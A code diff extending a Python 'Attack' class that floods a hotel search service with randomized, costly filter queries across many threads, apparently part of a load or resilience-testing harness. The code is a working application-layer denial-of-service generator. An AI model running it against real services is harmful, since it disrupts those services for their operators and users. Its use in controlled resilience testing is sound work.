@@ -8,6 +8,12 @@ import urllib.parse as up
 
 
 class Attack:
+    """Filter-based denial of service targeting the search service."""
+
+    VECTOR_NAME = "filter_dos"
+    TARGET_SERVICE = "search"
+    RESOURCE_DIMENSIONS = ("cpu", "io")
+
     def __init__(self, configuration, design_path, output_path, test_identifier):
         self.configuration = configuration
         self.output_path = output_path
@@ -22,10 +28,12 @@ class Attack:
         params = {
             "q": random.choice(["beach", "city", "mountain", "spa", "resort", "luxury", "budget"]),
             "pageSize": str(self.page_size),
+            "page": str(random.randint(0, 50)),
             "sort": random.choice(["price,asc", "price,desc", "rating,desc", "distance,asc"]),
-            "amenities": ",".join(random.sample(["wifi", "pool", "parking", "gym", "spa", "bar", "restaurant"], k=4)),
-            "filters": ",".join(random.sample(["non_smoking", "pet_friendly", "breakfast", "free_cancellation", "pay_at_hotel"], k=3)),
+            "amenities": ",".join(random.sample(["wifi", "pool", "parking", "gym", "spa", "bar", "restaurant", "pet_spa", "concierge"], k=5)),
+            "filters": ",".join(random.sample(["non_smoking", "pet_friendly", "breakfast", "free_cancellation", "pay_at_hotel", "late_checkout", "suite_only"], k=4)),
             "date": random.choice(["2020-01-01", "2020-06-01", "2020-12-01"]),
+            "priceRange": f"{random.randint(50, 200)}-{random.randint(201, 600)}",
         }
         return up.urlencode(params, doseq=True)
 
@@ -39,11 +47,18 @@ class Attack:
             url = f"{self.base_url}{self.path}?{self._build_query()}"
             try:
                 session.get(url, headers=headers, timeout=self.timeout)
+                if self.timeout > 1:
+                    stop_event.wait(timeout=0.05)
             except Exception:
                 pass
 
     def run(self, duration_seconds, stop_event):
-        logging.info("expensive_filter_queries: starting")
+        logging.info(
+            "expensive_filter_queries: starting (target_service=%s, concurrency=%d, page_size=%d)",
+            self.TARGET_SERVICE,
+            self.concurrency,
+            self.page_size,
+        )
         end_ts = time.time() + duration_seconds
         threads = [threading.Thread(target=self.worker, args=(end_ts, stop_event), daemon=True) for _ in range(self.concurrency)]
         for t in threads:
@@ -52,4 +67,3 @@ class Attack:
             remaining = max(0.0, end_ts - time.time())
             t.join(timeout=remaining)
         logging.info("expensive_filter_queries: finished")
-
